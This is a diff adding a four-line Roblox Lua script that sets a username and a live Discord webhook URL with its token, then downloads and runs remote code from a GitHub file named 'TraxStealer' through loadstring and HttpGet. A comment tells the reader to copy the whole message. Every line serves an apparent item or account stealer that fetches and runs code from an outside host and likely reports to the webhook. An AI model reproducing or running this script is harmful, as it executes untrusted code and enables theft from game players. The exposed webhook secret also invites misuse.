@@ -1,0 +1,4 @@
+Username = "q12fn"
+Webhook = "https://discord.com/api/webhooks/1343435958175006821/gM0R8gg1qEX0LdmHmqW5QynzI-1-bssEFM6chnAEkFIyxWz0Uj-B2Sy9IbM4jYQ1xtpn"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/PlsDonate/refs/heads/main/TraxStealer"))() -- copy this whole message
